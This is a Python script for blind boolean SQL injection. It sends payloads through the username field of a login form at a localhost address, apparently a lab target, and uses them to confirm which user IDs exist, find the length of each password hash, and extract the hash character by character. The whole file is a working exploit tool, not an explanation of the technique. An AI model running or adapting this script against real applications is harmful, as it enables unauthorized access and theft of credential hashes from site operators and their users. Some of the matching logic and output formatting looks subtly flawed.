import requests

# Global counter to track the total number of SQL queries made
total_queries = 0

# Character set for hexadecimal characters
charset = "0123456789abcdef"

# Target URL for the SQL injection
target = "http://127.0.0.1:8080"

# Needle text used to detect SQL injection success
needle = "Welcome back"


def injected_query(payload):
    """
    Sends a SQL injection payload to the target URL and increments query count.
    Checks if the response does not contain the 'needle' text, indicating a successful injection.

    Args:
        payload (str): The SQL injection payload to be sent.

    Returns:
        bool: True if the injection altered the response, False otherwise.
    """
    global total_queries
    response = requests.post(
        target,
        data={"username": "admin' or {}--".format(payload), "password": "password"},
    )
    total_queries += 1
    return needle.encode() not in response.content


def boolean_query(offset, user_id, character, operator=">"):
    """
    Constructs and sends a SQL payload to check if a specific character in the password matches conditions.

    Args:
        offset (int): The position in the password to check.
        user_id (int): The ID of the user whose password is being checked.
        character (str): The character to compare against the password.
        operator (str): The comparison operator (e.g., '>', '<', '=').

    Returns:
        bool: Result of the injected query.
    """
    payload = (
        "(select hex(substr(password,{},1)) from user where id={}) {} hex('{}')".format(
            offset + 1, user_id, operator, character
        )
    )
    return injected_query(payload)


def invalid_user(user_id):
    """
    Checks if a user ID is valid by attempting a SQL injection that would always return true if the user exists.

    Args:
        user_id (int): The ID of the user to check.

    Returns:
        bool: False if user exists, True otherwise.
    """
    payload = "(select id from user where id = {}) >= 0".format(user_id)
    return injected_query(payload)


def password_length(user_id):
    """
    Determines the length of a user's password by incrementally testing for the maximum valid password length.

    Args:
        user_id (int): The ID of the user whose password length is being determined.

    Returns:
        int: The length of the user's password.
    """
    i = 0
    while True:
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(
            user_id, i
        )
        if not injected_query(payload):
            return i
        i += 1


def extract_hash(charset, user_id, password_length):
    """
    Extracts the hash of the user's password by iteratively confirming each character using a boolean query.

    Args:
        charset (str): Set of possible characters in the password.
        user_id (int): User ID whose password is being extracted.
        password_length (int): Length of the password.

    Returns:
        str: The extracted hash of the password.
    """
    found = ""
    for i in range(password_length):
        for char in charset:
            if boolean_query(i, user_id, char):
                found += char
                break
    return found


def total_queries_reqd():
    """
    Displays the total number of queries made and resets the counter.
    """
    global total_queries
    print("\t\t[!] {} total queries!".format(total_queries))
    total_queries = 0


# Main loop to handle user input and initiate password hash extraction
while True:
    try:
        user_id = input(">> Enter user ID to extract password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
            total_queries_reqd()
            print(
                "\t[-] User {} hash: {}".format(
                    user_id, extract_hash(charset, int(user_id), user_password_length)
                )
            )
            total_queries_reqd()
        else:
            print("\t[-] User {} does not exist!")
    except KeyboardInterrupt:
        print("\nProcess interrupted by user.")
        break
